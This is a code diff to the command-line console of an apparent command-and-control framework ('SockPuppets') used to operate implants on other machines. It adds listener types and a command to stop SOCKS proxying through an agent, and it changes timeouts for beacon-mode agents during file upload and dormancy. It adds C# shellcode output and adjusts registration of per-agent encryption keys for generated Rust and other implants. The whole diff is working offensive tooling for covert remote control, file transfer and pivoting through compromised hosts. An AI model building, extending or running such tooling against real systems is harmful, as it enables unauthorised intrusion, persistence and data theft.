@@ -229,7 +229,7 @@ class SockPuppetsCLI(cmd.Cmd):
         print()
 
     def do_stop(self, arg):
-        """Stop listener(s): stop [ws|http|https] (no arg = stop all)"""
+        """Stop listener(s): stop [ws|http|https|dns|smb] (no arg = stop all)"""
         if not self.server:
             print("[-] No server running")
             return
@@ -238,10 +238,10 @@ class SockPuppetsCLI(cmd.Cmd):
         listener_type = None
         if arg in ('ws', 'websocket'):
             listener_type = 'websocket'
-        elif arg in ('http', 'https'):
+        elif arg in ('http', 'https', 'dns', 'smb'):
             listener_type = arg
         elif arg:
-            print("[-] Usage: stop [ws|http|https] (no arg = stop all)")
+            print("[-] Usage: stop [ws|http|https|dns|smb] (no arg = stop all)")
             return
 
         try:
@@ -253,9 +253,10 @@ class SockPuppetsCLI(cmd.Cmd):
             if listener_type:
                 print(f"[+] {listener_type.upper()} listener(s) stopped")
             else:
-                # Full cleanup when stopping all listeners
                 self.server.active_connections.clear()
-                self.server.agents.clear()
+                agent_count = len(self.server.agents)
+                if agent_count > 0:
+                    print(f"[*] {agent_count} agent(s) still tracked (use 'remove' to clear)")
                 print("[+] All listeners stopped")
                 self.server_running = False
 
@@ -407,6 +408,7 @@ class SockPuppetsCLI(cmd.Cmd):
         print("[*] Type 'kill' to terminate the agent")
         print("[*] Type 'results' to view pending results")
         print("[*] Type 'socks <port> [user pass]' to start SOCKS proxy")
+        print("[*] Type 'stopsocks' to stop SOCKS proxy")
         print("[*] Type 'sleep <seconds>' to set beacon interval")
         print("[*] Type 'dormant <hours>' to put agent into dormancy")
         print("[*] Type 'upload <local_path> <remote_path>' to upload a file")
@@ -651,15 +653,17 @@ class SockPuppetsCLI(cmd.Cmd):
                                 continue
                             encoded = b64mod.b64encode(data).decode()
                             upload_cmd = f"__px:upload:{remote_path}:{encoded}"
+                            current_agent = self.server.agents.get(agent_id)
+                            if current_agent and current_agent.mode == 'beacon':
+                                print("[*] Waiting for beacon to check in...")
+                                timeout = 65
+                            else:
+                                timeout = 65
                             future = asyncio.run_coroutine_threadsafe(
                                 self.server.send_command_to_agent(agent_id, upload_cmd),
                                 self.loop
                             )
-                            current_agent = self.server.agents.get(agent_id)
-                            if current_agent and current_agent.mode == 'streaming':
-                                result = future.result(timeout=65)
-                            else:
-                                result = future.result(timeout=15)
+                            result = future.result(timeout=timeout)
                             print(f"[+] {result}")
                         except FileNotFoundError:
                             print(f"[-] Local file not found: {local_path}")
@@ -686,10 +690,25 @@ class SockPuppetsCLI(cmd.Cmd):
                         path = command.split(None, 1)[1]
                         command = f"__px:download:{path}"
 
+                    if command.lower() == 'stopsocks':
+                        if not self.loop:
+                            print("[-] Event loop not available")
+                            continue
+                        try:
+                            future = asyncio.run_coroutine_threadsafe(
+                                self.server.stop_socks_proxy(agent_id),
+                                self.loop
+                            )
+                            result = future.result(timeout=5)
+                            print(f"[+] {result}")
+                        except Exception as e:
+                            print(f"[-] Error: {str(e)}")
+                        continue
+
                     if command.lower().startswith('socks'):
                         parts = command.split()
                         if len(parts) < 2 or len(parts) > 4:
-                            print("[-] Usage: socks <port> [user pass]")
+                            print("[-] Usage: socks <port> [user pass] | stopsocks")
                             continue
 
                         try:
@@ -807,24 +826,6 @@ class SockPuppetsCLI(cmd.Cmd):
                             print(f"[-] Error: {str(e)}")
                         continue
 
-                    if command.lower().startswith('download '):
-                        parts = command.split(None, 1)
-                        if len(parts) != 2:
-                            print("[-] Usage: download <remote_path>")
-                            continue
-                        remote_path = parts[1]
-                        px_cmd = f"__px:download:{remote_path}"
-                        try:
-                            future = asyncio.run_coroutine_threadsafe(
-                                self.server.send_command_to_agent(agent_id, px_cmd),
-                                self.loop
-                            )
-                            result = future.result(timeout=15)
-                            print(f"[*] Download queued — result arrives on next beacon")
-                        except Exception as e:
-                            print(f"[-] Download error: {str(e)}")
-                        continue
-
                     if command.lower().startswith('dormant '):
                         parts = command.split()
                         if len(parts) != 2:
@@ -836,11 +837,17 @@ class SockPuppetsCLI(cmd.Cmd):
                                 print("[-] Hours must be positive")
                                 continue
                             dormant_cmd = f"__dormant:{hours}"
+                            current_agent = self.server.agents.get(agent_id)
+                            if current_agent and current_agent.mode == 'beacon':
+                                print("[*] Waiting for beacon to check in...")
+                                timeout = 65
+                            else:
+                                timeout = 15
                             future = asyncio.run_coroutine_threadsafe(
                                 self.server.send_command_to_agent(agent_id, dormant_cmd),
                                 self.loop
                             )
-                            result = future.result(timeout=15)
+                            result = future.result(timeout=timeout)
                             print(f"[+] Agent entering dormancy for {hours}h — it will resume automatically")
                         except ValueError:
                             print("[-] Invalid hours value")
@@ -862,18 +869,6 @@ class SockPuppetsCLI(cmd.Cmd):
                             )
                             result = future.result(timeout=15)
                             print(f"[+] {result}")
-                        except Exception as e:
-                            print(f"[-] Error: {str(e)}")
-                        continue
-
-                    if command.lower() == 'screenshot':
-                        try:
-                            future = asyncio.run_coroutine_threadsafe(
-                                self.server.send_command_to_agent(agent_id, "__px:screenshot"),
-                                self.loop
-                            )
-                            result = future.result(timeout=15)
-                            print(f"[+] Screenshot queued — result arrives on next beacon")
                         except Exception as e:
                             print(f"[-] Error: {str(e)}")
                         continue
@@ -1097,10 +1092,10 @@ class SockPuppetsCLI(cmd.Cmd):
                 val = get_value('--format')
                 if val is None:
                     return
-                if val in ['raw', 'c', 'python', 'powershell']:
+                if val in ['raw', 'c', 'python', 'powershell', 'csharp']:
                     shellcode_format = val
                 else:
-                    print(f"[-] Invalid shellcode format: {val}")
+                    print(f"[-] Invalid shellcode format: {val}. Use: raw, c, python, powershell, csharp")
                     return
             elif arg.startswith('--os'):
                 val = get_value('--os')
@@ -1359,13 +1354,13 @@ class SockPuppetsCLI(cmd.Cmd):
             print(f"\n[*] Generating Rust agent...")
             try:
                 arch = 'amd64' if 'x64' in architectures else architectures[0]
-                go_path = generator.generate_rust_agent(
+                rust_path = generator.generate_rust_agent(
                     host, port, encryption_key=key, transport=transport,
                     beacon_interval=beacon_interval, beacon_jitter=beacon_jitter,
                     target_os=target_os if target_os != 'auto' else 'windows',
                     target_arch=arch
                 )
-                results['rust'] = go_path
+                results['rust'] = rust_path
             except Exception as e:
                 results['rust'] = f"Error: {e}"
 
@@ -1417,10 +1412,12 @@ class SockPuppetsCLI(cmd.Cmd):
 
         # Register all generated per-agent keys with the server
         generated_keys = getattr(generator, 'generated_keys', [])
-        if generated_keys:
+        if generated_keys and self.server:
             for k in generated_keys:
                 self.server.add_encryption_key(k)
             print(f"\n[*] Registered {len(generated_keys)} unique agent keys with server")
+        elif generated_keys:
+            print(f"\n[*] {len(generated_keys)} agent keys generated (start server to register)")
 
         print("\n[+] Agent generation complete!")
         print("=" * 60)
